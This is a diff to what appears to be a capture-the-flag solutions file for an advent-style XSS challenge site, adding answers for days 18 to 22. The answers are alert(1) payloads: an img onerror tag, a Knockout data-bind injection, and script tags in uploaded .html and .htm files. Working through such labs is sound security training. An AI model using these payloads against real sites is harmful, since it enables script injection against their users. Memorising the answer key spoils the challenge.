@@ -121,3 +121,32 @@ https://xmass.compass-demo.com/level17
 ```
 " onerror="alert(1)"
 ```
+**+++ Day 18 +++**
+https://xmass.compass-demo.com/level18
+```
+<img src=# onerror="alert(1)"
+```
+**+++ Day 19 +++**
+https://xmass.compass-demo.com/level19
+```
+<p data-bind="text: alert(1)"></p>
+```
+**+++ Day 20 +++**
+https://xmass.compass-demo.com/level20
+
+Upload a `.html` file with the following content:
+```
+<script>alert(1)</script>
+```
+**+++ Day 21 +++**
+https://xmass.compass-demo.com/level21
+
+Upload a `.htm` file with the following content:
+```
+<script>alert(1)</script>
+```
+**+++ Day 22 +++**
+https://xmass.compass-demo.com/level22
+```
+tbc
+```
